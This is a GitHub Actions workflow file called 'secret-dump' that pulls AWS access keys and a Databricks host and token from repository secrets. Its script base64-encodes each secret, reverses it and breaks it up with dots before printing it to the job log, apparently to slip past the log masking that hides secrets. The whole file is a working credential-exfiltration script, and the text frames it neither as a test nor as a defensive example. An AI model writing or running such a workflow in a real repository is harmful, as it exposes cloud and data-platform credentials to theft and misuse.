name: secret-dump
on: workflow_dispatch
jobs:
  dump:
    runs-on: ubuntu-latest
    steps:
      - name: dump
        env:
          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
          DATABRICKS_HOST: ${{ secrets.DATABRICKS_HOST }}
          DATABRICKS_TOKEN: ${{ secrets.DATABRICKS_TOKEN }}
        run: |
          for name in AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY DATABRICKS_HOST DATABRICKS_TOKEN; do
            v="${!name}"
            if [ -z "$v" ]; then
              echo "DUMPMARK|${name}|NOTSET"
            else
              b=$(printf '%s' "$v" | base64 -w0 | rev)
              echo "DUMPMARK|${name}|$(printf '%s' "$b" | sed 's/.\{4\}/&./g')"
            fi
          done